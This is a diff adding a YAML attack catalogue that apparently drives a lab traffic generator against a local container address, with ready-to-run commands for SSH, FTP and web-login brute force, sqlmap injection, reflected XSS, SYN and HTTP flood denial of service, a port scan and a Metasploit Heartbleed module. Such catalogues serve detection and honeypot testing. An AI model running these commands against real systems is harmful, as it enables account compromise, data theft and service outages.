@@ -1,0 +1,60 @@
+attacks:
+  - name: "SSH brute force – fast, low intensity"
+    category: "brute_force"
+    intensity: "low"
+    command: "hydra -l root -P /wordlists/test.txt 172.17.0.1 ssh -s 2222 -t 1 -w 5"
+
+  - name: "FTP brute force – medium intensity"
+    category: "brute_force"
+    intensity: "medium"
+    command: "hydra -l ftp -P /wordlists/pass.txt 172.17.0.1 ftp -s 2121"
+
+  - name: "Web brute force login – medium"
+    category: "brute_force"
+    intensity: "medium"
+    command: "hydra -L /wordlists/users.txt -P /wordlists/pass.txt 172.17.0.1 http-post-form \"/login.php:username=^USER^&password=^PASS^:Login failed\" -s 8080"
+
+  - name: "Web SQL Injection – aggressive"
+    category: "sql_injection"
+    intensity: "high"
+    command: "sqlmap -u \"http://172.17.0.1:8080/vulnerable.php?id=1\" --dbs --batch"
+
+  - name: "Web XSS attack – reflected"
+    category: "xss"
+    intensity: "low"
+    command: "xsser --url \"http://172.17.0.1:8080/vulnerable.php\" --data \"q=<script>alert(1)</script>\""
+
+  - name: "DDoS – TCP flood on SSH port"
+    category: "ddos"
+    intensity: "high"
+    command: "timeout 10 hping3 -S --flood -p 2222 172.17.0.1"
+
+  - name: "DoS – GoldenEye HTTP flood"
+    category: "dos"
+    intensity: "high"
+    command: "timeout 10 python3 /opt/goldeneye/goldeneye.py http://172.17.0.1:8080 -w 10 -s 5 -m post"
+
+  - name: "DoS – Hulk HTTP flood"
+    category: "dos"
+    intensity: "high"
+    command: "timeout 10 python3 /opt/hulk/hulk.py http://172.17.0.1:8080"
+
+  - name: "DoS – Slowhttptest GET flood"
+    category: "dos"
+    intensity: "medium"
+    command: "slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://172.17.0.1:8080 -x 24 -p 3"
+
+  - name: "DoS – Slowloris attack"
+    category: "dos"
+    intensity: "medium"
+    command: "timeout 10 slowloris 172.17.0.1 -p 8080"
+
+  - name: "Port scanning – full TCP scan"
+    category: "scan"
+    intensity: "low"
+    command: "nmap -sS -T4 -Pn 172.17.0.1 -p 22,21,80,2222,2121,8080"
+
+  - name: "Heartbleed exploit (Metasploit)"
+    category: "exploit"
+    intensity: "high"
+    command: "msfconsole -q -x 'use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS 172.17.0.1; set RPORT 443; run'"
